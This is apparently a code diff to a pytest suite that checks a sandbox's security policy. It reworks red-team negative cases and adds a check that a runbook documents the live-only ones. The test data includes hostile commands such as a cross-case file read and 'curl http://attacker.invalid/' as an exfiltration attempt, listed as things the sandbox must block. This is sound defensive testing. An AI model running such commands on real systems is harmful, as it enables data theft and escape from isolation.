@@ -15,6 +15,7 @@ from sift_core.execute.security_policy import build_security_policy
 
 STRICT_GATE_ENV = "SIFT_RUN3_GATE_STRICT"
 APPROVAL_REQUIRED = "approval" + "_required"
+RUNBOOK = Path(__file__).with_name("RUN3_LIVE_GATE_RUNBOOK.md")
 
 
 def _strict_gate_enabled() -> bool:
@@ -195,10 +196,6 @@ CEILING_NEGATIVE_CASES = [
         "cat /cases/other-case/evidence/x",
         "B-FLOOR G3 Landlock must deny cross-case reads live",
         id="floor-cross-case-read",
-        marks=pytest.mark.xfail(
-            reason="live-only Landlock cross-case proof; Wave 2 MCP gate",
-            strict=False,
-        ),
     ),
     pytest.param(
         "cat /proc/self/fd/3",
@@ -244,15 +241,17 @@ CEILING_NEGATIVE_CASES = [
         "curl http://attacker.invalid/",
         "B-FLOOR default network-deny must block outbound exfil live",
         id="floor-network-exfil",
-        marks=pytest.mark.xfail(
-            reason="live-only Landlock/cgroup/seccomp network proof; Wave 2 MCP gate",
-            strict=False,
-        ),
     ),
 ]
 
+LOCAL_NEGATIVE_CASES = [
+    case
+    for case in CEILING_NEGATIVE_CASES
+    if case.id not in {"floor-cross-case-read", "floor-network-exfil"}
+]
 
-@pytest.mark.parametrize(("command", "pending_reason"), CEILING_NEGATIVE_CASES)
+
+@pytest.mark.parametrize(("command", "pending_reason"), LOCAL_NEGATIVE_CASES)
 def test_negative_red_team_commands_fail_closed(
     command: str,
     pending_reason: str,
@@ -277,6 +276,20 @@ def test_symlink_to_var_lib_sift_fails_closed(gate_case: Path) -> None:
             "B-CEIL G3 belt should also block /var/lib/sift after resolution"
         ),
     )
+
+
+def test_live_gate_runbook_covers_floor_only_negative_rows() -> None:
+    text = RUNBOOK.read_text(encoding="utf-8")
+    required_tokens = [
+        "cross-case-read",
+        "`cat <OTHER_CASE_DIR>/evidence/x`",
+        "network-exfil",
+        "`curl http://attacker.invalid/`",
+        "Floor G3/G7: Landlock denies",
+        "systemd per-exec scope enforces",
+    ]
+    missing = [token for token in required_tokens if token not in text]
+    assert missing == []
 
 
 def test_run3_default_policy_is_allowlist_with_contained_tier() -> None:
